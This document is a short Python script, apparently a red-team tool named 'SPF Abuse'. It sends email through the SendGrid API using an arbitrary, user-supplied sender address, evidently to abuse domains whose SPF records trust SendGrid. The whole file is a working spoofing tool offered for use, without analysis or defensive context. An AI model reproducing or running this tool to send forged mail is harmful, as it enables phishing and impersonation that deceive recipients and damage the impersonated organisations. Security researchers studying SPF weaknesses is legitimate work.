from urllib.request import urlopen, Request
import sys
import base64
import json

def send_api_request(apikey, body, to):
	request = Request("https://api.sendgrid.com/v3/mail/send")
	request.add_header("Authorization", "Bearer %s" % apikey)
	request.add_header("Content-Type", "application/json")
	
	try:
		response = urlopen(request, body.encode())
		print("[*] Message was sent to %s\n----------------------------------------" % to)
		print(response.headers)
	
	except:
		print("Error: %s" % sys.exc_info()[1])
	
if __name__ == "__main__":
	print("SPF Abuse - Mr.Un1k0d3r RingZer0 Team\n")
	
	if len(sys.argv) < 6:
		print("Usage: %s from to subject pathtofile apikey" % sys.argv[0])
		sys.exit(0)
		
	body = {}
	body["personalizations"] = []
	
	personalizations = {}
	personalizations["to"] = []
	to = {"email": sys.argv[2]}
	personalizations["to"].append(to)
	personalizations["subject"] = sys.argv[3]
	body["personalizations"].append(personalizations)
	
	body["from"] = {}
	body["from"]["email"] = sys.argv[1]
	
	body["content"] = []
	content = {}
	content["type"] = "text/plain";
	content["value"] = open(sys.argv[4]).read()
	body["content"].append(content)
	
	body = json.dumps(body)
	
	apikey = sys.argv[5]
		
	send_api_request(apikey, body, sys.argv[2])
